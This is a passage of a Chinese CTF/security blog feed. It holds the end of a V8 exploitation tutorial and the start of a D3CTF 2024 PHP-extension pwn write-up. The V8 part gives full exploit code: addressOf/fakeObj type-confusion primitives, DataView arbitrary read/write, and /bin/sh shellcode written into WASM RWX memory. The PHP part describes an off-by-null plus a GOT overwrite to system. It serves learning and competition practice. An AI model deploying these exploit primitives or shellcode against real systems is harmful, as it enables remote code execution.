function_">print</span>(<span class="string">&quot;[*] float array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(float_array_map)));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(object_array_map)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    float_array[<span class="number">0</span>] = obj;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(float_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>addressOf</code> 函数的功能为获取指定对象 <code>obj</code> 的地址，建议读者仔细阅读和理解该函数的实现原理<br>同理，我们也可以用类似的思路来实现任意地址的写，不过有一点点绕  </p><h2 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h2><p>任意地址写的思想为伪造一个 <code>object</code>，根据类型混淆可以将该原语封装成一个函数：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    object_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr | <span class="number">1n</span>);</span><br><span class="line">    object_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    <span class="keyword">return</span> object_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里还是希望读者可以自行思考和理解该原语是如何实现伪造 <code>object</code> 的。<br>我们伪造的 <code>object</code> 是在 <code>elements</code> 上面的，而 <code>elements</code> 上的数据是可控的，我们可以按照如下样式伪造一个存在浮点数的 <code>object</code>  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> float_array_mem = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    <span class="number">0</span>,  <span class="comment">// 没有原型</span></span><br><span class="line">    <span class="title function_">u2d</span>(target - <span class="number">0x10n</span>),  <span class="comment">// fake elements ptr</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x100000000n</span>),  <span class="comment">// fake length</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>这里伪造的是一个没有原型的存在浮点数的 <code>objcet</code>，<code>target</code> 为我们想要进行写的地址，也就是伪造的 <code>elements</code><br>我们可以在泄露出 <code>float_array_mem</code> 的地址后通过 <code>fakeObj(fake_obj_addr)</code> 函数来获取我们的 <code>fake object</code>，然后向 <code>target</code> 写入数据。至于为什么 <code>target</code> 要 <code>-0x10</code> 呢，因为 <code>elements</code> 上面有 <code>0x10</code> 字节用于存储 <code>map</code> 和 <code>length</code><br>有了对象地址泄露和任意地址写，我们就以为能够在 <code>WASM</code> 上愉快的写 <code>shellcode</code> 了，可事情并没有这么简单，即在写 <code>0x7fxxxxx</code> 这样的高地址的时候会出现问题，地址的低位会被修改，导致出现访问异常。因为写原语使用的是 <code>FloatArray</code> 的写入操作，而 <code>Double</code> 类型的浮点数数组在处理 <code>7f</code> 开头的高地址时会出现将低 <code>20</code> 位与运算为 <code>0</code><br>这时候我们就要使用 <code>DataView </code>对象，该对象的结构如下：  </p><img src="/2024/05/05/v8start/9.png" class="" title="我的图图呢">  <p>这是用来读写 <code>ArrayBuffer</code> 的 <code>BackingStore</code> 的内容的对象，在 <code>exploit</code> 里常用作最后的任意地址读写原语的构造。<br>可以看见这个 <code>DataView</code> 多了一个 <code>BackingStore</code>。<code>DataView</code> 对象中的 <code>backing_store</code> 会指向申请的 <code>data_buf</code> (<code>backing_store</code> 相当于我们的 <code>elements</code>)，修改 <code>backing_store</code> 为我们想要写的地址，并通过 <code>DataView</code> 对象的 <code>setBigUint64</code> 方法就可以往指定地址正常写入数据了。<br>那现在我们的思路就很明确了，首先申请 <code>2</code> 个 <code>ArrayBuffer</code> 对象 <code>ab1</code>、<code>ab2</code>，申请他们各自的 <code>DataView</code> 对象 <code>dv1</code>、<code>dv2</code>。将伪造的 <code>fakeobj</code> 的 <code>elements</code> 指向 <code>dv1</code> 的 <code>BackingStore-0x10</code>，再通过修改 <code>fakeobj</code> 令 <code>dv1</code> 的 <code>BackingStore</code> 指向 <code>dv2</code> 的 <code>BackingStore-0x10</code><br>此时，我们可以通过修改 <code>fakeobj</code> 来修改 <code>dv2</code> <code>BackingStore</code> 处的值，最后通过 <code>dv2</code> 的内置函数来实现任意地址的读写。提醒一下，这里要区分开 <code>BackingStore</code> 的地址和 <code>BackingStore</code> 地址出的值这2个概念。原语封装函数如下：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> object_array_map = object_array.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] float array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(float_array_map)));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(object_array_map)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    float_array[<span class="number">0</span>] = obj;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(float_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    object_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr | <span class="number">1n</span>);</span><br><span class="line">    object_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    <span class="keyword">return</span> object_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ab1 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">var</span> ab2 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">var</span> dv1 = <span class="keyword">new</span> <span class="title class_">DataView</span>(ab1);</span><br><span class="line"><span class="keyword">var</span> dv2 = <span class="keyword">new</span> <span class="title class_">DataView</span>(ab2);</span><br><span class="line"><span class="keyword">var</span> ab1_bs_addr = <span class="title function_">addressOf</span>(ab1) + <span class="number">0x20n</span>;</span><br><span class="line"><span class="keyword">var</span> ab2_bs_addr = <span class="title function_">addressOf</span>(ab2) + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_array_mem = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    <span class="number">0</span>,  <span class="comment">// 没有原型</span></span><br><span class="line">    <span class="title function_">u2d</span>(ab1_bs_addr - <span class="number">0x10n</span>),  <span class="comment">// fake elements ptr</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x100000000n</span>),  <span class="comment">// fake length</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">fake_float_array = <span class="title function_">fakeObj</span>(<span class="title function_">addressOf</span>(float_array_mem) + <span class="number">0x30n</span>);</span><br><span class="line">fake_float_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(ab2_bs_addr - <span class="number">1n</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_mem_addr = <span class="title function_">arbitrary_address_read</span>(<span class="title function_">addressOf</span>(wasm_mod) - <span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] rwx mem addr: &quot;</span> + <span class="title function_">hex</span>(rwx_mem_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">    <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">    <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">arbitrary_address_write</span>(rwx_mem_addr + <span class="title class_">BigInt</span>(i) * <span class="number">8n</span>, shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>十分简单的入门了一下 <code>v8</code> 漏洞利用，该类漏洞以及利用方式还有很多，看来有的学了<br>今天 <code>Csome</code> 学长在 <code>defcon</code> 拿了一血，太牛拉  </p><img src="/2024/05/05/v8start/10.png" class="" title="我的图图呢">  <p>哎，我也想成为像他那么强，还有很长的路要走啊。md，不说那么多了，开卷！！！<br>参考：<br><a href="https://www.anquanke.com/post/id/267518">https://www.anquanke.com/post/id/267518</a><br><a href="https://blog.csdn.net/qq_45323960/article/details/130124693">https://blog.csdn.net/qq_45323960/article/details/130124693</a><br><a href="https://blog.csdn.net/weixin_46483787/article/details/134934993">https://blog.csdn.net/weixin_46483787/article/details/134934993</a><br><a href="https://ponyfoo.com/articles/an-introduction-to-speculative-optimization-in-v8">https://ponyfoo.com/articles/an-introduction-to-speculative-optimization-in-v8</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>D3CTF 2024</title>
      <link href="/2024/04/29/d3ctf2024/"/>
      <url>/2024/04/29/d3ctf2024/</url>
      
        <content type="html"><![CDATA[<h1 id="PwnShell"><a href="#PwnShell" class="headerlink" title="PwnShell"></a>PwnShell</h1><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>很久以前就听说过 <code>php pwn</code>，没想到就在这里遇到了。出题人自己实现了一个 <code>php</code> 扩展模块 <code>vuln.so</code>，很显然漏洞就来源于这里，通过逆向分析发现出题人在这个模块中实现的菜单堆，其漏洞函数如下：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">zif_addHacker</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v7; <span class="comment">// r12</span></span><br><span class="line">  _QWORD *v8; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> *v9; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v10; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *v11; <span class="comment">// rsi</span></span><br><span class="line">  _BYTE *v12; <span class="comment">// r13</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *v14; <span class="comment">// [rsp+8h] [rbp-40h] BYREF</span></span><br><span class="line">  _BYTE *v15; <span class="comment">// [rsp+10h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+18h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v3 = *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">44</span>);</span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)zend_parse_parameters(v3, &amp;unk_2000, &amp;v15, &amp;v14) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v15[<span class="number">8</span>] == <span class="number">6</span> &amp;&amp; v14[<span class="number">8</span>] == <span class="number">6</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="number">0LL</span>;</span><br><span class="line">      v6 = &amp;chunkList[<span class="number">2</span>];</span><br><span class="line">      <span class="keyword">while</span> ( *v6 != <span class="number">1</span> )                        <span class="comment">// 寻找空闲堆块</span></span><br><span class="line">      &#123;</span><br><span class="line">        ++v5;</span><br><span class="line">        v6 += <span class="number">0x10</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="number">0x10</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">      &#125;</span><br><span class="line">      v2 = v5;</span><br><span class="line">LABEL_9:</span><br><span class="line">      v7 = &amp;chunkList[<span class="number">4</span> * v2];</span><br><span class="line">      v8 = (_QWORD *)_emalloc(*(_QWORD *)(*(_QWORD *)v14 + <span class="number">0x10</span>LL) + <span class="number">0x10</span>LL);<span class="comment">// v14字符串长度+0x10</span></span><br><span class="line">      v9 = (<span class="type">void</span> *)_emalloc(*(_QWORD *)(*(_QWORD *)v15 + <span class="number">0x10</span>LL));<span class="comment">// v15字符串的长度</span></span><br><span class="line">      *v8 = v9;                                 <span class="comment">// 存v15的地址</span></span><br><span class="line">      v10 = *(_QWORD *)(*(_QWORD *)v15 + <span class="number">0x10</span>LL);<span class="comment">// v15字符串长度</span></span><br><span class="line">      v11 = (<span class="type">const</span> <span class="type">void</span> *)(*(_QWORD *)v15 + <span class="number">0x18</span>LL);<span class="comment">// v15字符串的起始地址</span></span><br><span class="line">      v8[<span class="number">1</span>] = v10;                              <span class="comment">// 存v15字符串的长度</span></span><br><span class="line">      <span class="built_in">memcpy</span>(v9, v11, v10);                     <span class="comment">// 复制v15字符串内容到v9中</span></span><br><span class="line">      v12 = v14;</span><br><span class="line">      <span class="built_in">memcpy</span>(v8 + <span class="number">2</span>, (<span class="type">const</span> <span class="type">void</span> *)(*(_QWORD *)v14 + <span class="number">0x18</span>LL), *(_QWORD *)(*(_QWORD *)v14 + <span class="number">0x10</span>LL));</span><br><span class="line">      v13 = *(_QWORD *)(*(_QWORD *)v12 + <span class="number">0x10</span>LL);<span class="comment">// 存v14字符串的长度</span></span><br><span class="line">      *(_QWORD *)v7 = v8;</span><br><span class="line">      v7[<span class="number">2</span>] = <span class="number">13</span>;</span><br><span class="line">      *((_BYTE *)v8 + v13 + <span class="number">0x10</span>) = <span class="number">0</span>;          <span class="comment">// 存在off by null</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(a2 + <span class="number">8</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v16 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里先对部分语句进行介绍，首先是下面这段代码：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3 = *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">44</span>);</span><br></pre></td></tr></table></figure><p>其作用是获取函数的参数个数。接下来是 <code>zend_parse_parameters</code> 函数，其函数原型为：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">END_API <span class="type">int</span> <span class="title function_">zend_parse_parameters</span><span class="params">(<span class="type">int</span> num_args, <span class="type">const</span> <span class="type">char</span> *type_spec, ...)</span></span><br></pre></td></tr></table></figure><p>第一个参数是传递的参数个数。通常使用 <code>ZEND_NUM_ARGS()</code> 来获取。 第二个参数是一个字符串，指定了函数期望的各个参数的类型，后面紧跟着需要随参数值更新的变量列表。 因为 <code>php</code> 采用松散的变量定义和动态的类型判断，这样做就使得把不同类型的参数转化为期望的类型成为可能。<br>下表列出了可能指定的类型：  </p><table><thead><tr><th>类型指定符</th><th>对应的C类型</th><th>描述</th></tr></thead><tbody><tr><td>l</td><td>long</td><td>符号整数</td></tr><tr><td>d</td><td>double</td><td>浮点数</td></tr><tr><td>s</td><td>char *, int</td><td>二进制字符串，长度</td></tr><tr><td>b</td><td>zend_bool</td><td>逻辑型（1或0）</td></tr><tr><td>r</td><td>zval *</td><td>资源（文件指针，数据库连接等）</td></tr><tr><td>a</td><td>zval *</td><td>联合数组</td></tr><tr><td>o</td><td>zval *</td><td>任何类型的对象</td></tr><tr><td>O</td><td>zval *</td><td>指定类型的对象。需要提供目标对象的类类型</td></tr><tr><td>z</td><td>zval *</td><td>无任何操作的zval</td></tr></tbody></table><p>例如下面的例子：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">&quot;sl&quot;</span>, &amp;str, &amp;str_len, &amp;n)</span><br></pre></td></tr></table></figure><p>该表达式则是获取两个参数 <code>str</code> 和 <code>n</code>，字符串的类型是 <code>s</code>，需要两个参数 <code>char *</code> 字符串和 <code>int</code> 长度；数字的类型 <code>l</code> ，只需要一个参数。<br>现在重新回到题目的代码，可以看到存在一个 <code>off by null</code> 漏洞（注释里面有写），这里我们就要先认识一下 <code>php</code> 的堆结构。<code>php</code> 的堆结构类似于 <code>libc 2.27</code> 的 <code>tcache</code>， 在 <code>tcache</code> 的基础上删去了 <code>head</code> 头。由此可见，<code>php</code> 的堆还是挺好利用的。由于 <code>vuln.so</code> 模块的 <code>RELRO</code> 开启状态为 <code>Partial RELRO</code>，所以我们可以通过 <code>off by null</code> 漏洞和堆风水修改堆块的 <code>fd</code> 指针，实现修改 <code>_efree</code> 函数的 <code>got</code> 表为 <code>system，</code>从而实现任意指令的执行<br>接下来的问题是如何泄露地址，这里需要用到一个 <code>linux</code> 的知识。<code>linux</code> 系统内核提供了一种通过 <code>/proc</code> 的文件系统，在程序运行时访问内核数据，改变内核设置的机制。<code>/proc</code> 是一种伪文件结构，也就是说是仅存在于内存中。<code>/proc</code> 中一般比较重要的目录是 <code>sys</code>、<code>net</code> 和 <code>scsi</code>，<code>sys</code> 目录是可写的，可以通过它来访问和修改内核的参数 <code>/proc</code> 中有一些以 <code>PID</code> 命名（进程号）的进程目录，可以读取对应进程的信息，另外还有一个 <code>/self</code> 目录，用于记录本进程的信息。也即可以通过 <code>/proc/$PID/</code> 目录来获得该进程的信息，但是这个方法需要知道进程的 <code>PID</code> 是多少，在 <code>fork</code>、<code>daemon</code> 等情况下，<code>PID</code> 可能还会发生变化。所以 <code>Linux</code> 提供了 <code>self</code> 目录，来解决这个问题，不过不同的进程来访问这个目录获得的信息是不同的，内容等价于 <code>/proc/</code> 本进程  <code>PID</code> 目录下的内容。所以可以通过 <code>self</code> 目录直接获得自身的信息，不需要知道 <code>PID</code>。<br>那么，我们这里只需要读取 <code>/proc/self/maps</code> 文件即可。然后，在输出中得到 <code>libc</code> 地址和 <code>vuln.so</code> 的地址。<br>这里，还需要用到 <code>php</code> 的一个技巧，即 <code>ob</code> 函数。在 <code>php</code> 中我们可以通过 <code>ob_start</code> 来打开缓冲区，然后程序的输出流就会被存储到变量中，我们可以使用 <code>ob_get_contents</code> 来获得 输出流，然后通过正则匹配从输出流中获得地址。<br>这部分可以当作板子来用，就像这一道题目用于泄露地址的代码为：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 